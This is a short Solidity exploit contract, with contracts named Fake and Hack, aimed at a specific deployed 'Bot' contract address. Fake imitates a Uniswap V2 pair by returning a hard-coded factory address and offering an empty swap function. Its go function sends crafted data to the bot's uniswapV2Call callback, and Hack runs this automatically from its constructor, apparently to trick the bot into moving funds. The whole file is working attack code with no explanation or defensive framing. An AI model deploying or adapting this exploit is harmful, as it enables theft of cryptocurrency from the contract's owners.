pragma solidity =0.8.21;

interface Bot {
    function uniswapV2Call(address sender, uint, uint, bytes calldata data) external;
}

contract Fake {
    function factory() external returns (address) {
        return 0x164e31a6Ac83D5EDaE2139Add30099485D15d138;
    }

    function go() external {
        address pair1 = address(this);
        uint amount1 = 1056306580606230337;
        uint amount2 = 0;
        bool dir = false;
        address pair2 = address(0);
        bytes memory data = abi.encode(pair1, pair2, amount1, amount2, dir);
        Bot(0x607D86B806E7b2993438E82af2236C786a0Ff780).uniswapV2Call(0x607D86B806E7b2993438E82af2236C786a0Ff780, 0, 0, data);
    }

    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external {

    }
}

contract Hack {
    constructor() {
        Fake f = new Fake();
        f.go();
    }
}
